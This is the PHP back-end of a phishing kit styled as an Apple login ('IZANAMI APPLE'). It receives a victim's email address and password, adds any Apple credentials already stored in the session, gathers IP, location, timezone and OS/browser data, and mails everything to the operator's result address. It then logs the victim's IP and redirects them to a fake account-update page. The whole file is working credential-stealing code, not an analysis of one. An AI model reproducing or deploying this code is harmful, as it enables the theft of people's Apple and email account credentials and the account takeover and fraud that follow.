<?php include_once'BOT/proxy.php';?><?php
session_start();
error_reporting(0);
include '../main.php';
if($_POST['email'] == "") {
	exit();
}
$subject = "Access Email: ".$_POST['email']." [ $cn - $os - $ip2 ]";
$headers .= "From: AKSES EMAIL <admin@izanami.apps>" . "\r\n";
if($setting['mix_email'] == 'on') {
	$message  = "#-------------------------[ LOGIN APPLE ]-----------------------------#\n";
	$message .= "Email			: ".$_SESSION['email']."\n";
	$message .= "Password		: ".$_SESSION['password']."\n";
	$message  = "#-------------------------[ AKSES EMAIL ]-----------------------------#\n";
	$message .= "Email			: ".$_POST['email']."\n";
	$message .= "Password		: ".$_POST['password']."\n";
	$message .= "#--------------------------[ PC INFORMATION ]--------------------------#\n";
	$message .= "IP Address		: ".$ip2."\n";
	$message .= "Region		    : ".$regioncity."\n";
	$message .= "City		    : ".$citykota."\n";
	$message .= "Continent		: ".$continent."\n";
	$message .= "Timezone		: ".$timezone."\n";
	$message .= "OS/Browser		: ".$os." / ".$br."\n";
	$message .= "Date			: ".$date."\n";
	$message .= "#--------------------------[ IZANAMI APPLE ]-----------------------------#\n";
mail($setting['email_result'], $subject, $message, $headers);
}else{
	$message  = "#-------------------------[ AKSES EMAIL ]-----------------------------#\n";
	$message .= "Email			: ".$_POST['email']."\n";
	$message .= "Password		: ".$_POST['password']."\n";
	$message .= "#--------------------------[ PC INFORMATION ]--------------------------#\n";
	$message .= "IP Address		: ".$ip2."\n";
	$message .= "Region		    : ".$regioncity."\n";
	$message .= "City		    : ".$citykota."\n";
	$message .= "Continent		: ".$continent."\n";
	$message .= "Timezone		: ".$timezone."\n";
	$message .= "OS/Browser		: ".$os." / ".$br."\n";
	$message .= "Date			: ".$date."\n";
	$message .= "#--------------------------[ IZANAMI APPLE ]-----------------------------#\n";
mail($setting['email_result'], $subject, $message, $headers);
}

$click = fopen("../result/total_email.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Login Email Access"."\n");
fclose($click);
echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
exit(); 
?>